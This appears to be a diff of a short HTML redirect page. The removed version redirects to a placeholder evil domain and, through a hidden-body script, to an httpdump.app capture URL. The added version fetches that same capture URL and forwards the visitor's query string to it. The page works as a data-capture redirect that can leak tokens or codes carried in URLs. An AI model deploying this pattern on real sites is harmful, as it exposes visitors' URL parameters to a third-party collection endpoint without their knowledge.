@@ -1,8 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta http-equiv="refresh" content="0;url=https://your-evil-domain.com">
-    <script>window.location.replace("https://httpdump.app/dumps/d1f39022-f458-41e7-9757-0fa721a5dccb"+window.location.search);</script>
+    <title>Redirect</title>
 </head>
-<body style="visibility:hidden">Redirecting...</body>
+<body>
+    <a href="https://httpdump.app/dumps/d1f39022-f458-41e7-9757-0fa721a5dccb">Click here</a>
+    <script>
+        fetch('https://httpdump.app/dumps/d1f39022-f458-41e7-9757-0fa721a5dccb', {method:'GET',mode:'no-cors'});
+        window.location.href = 'https://httpdump.app/dumps/d1f39022-f458-41e7-9757-0fa721a5dccb' + window.location.search;
+    </script>
+</body>
 </html>
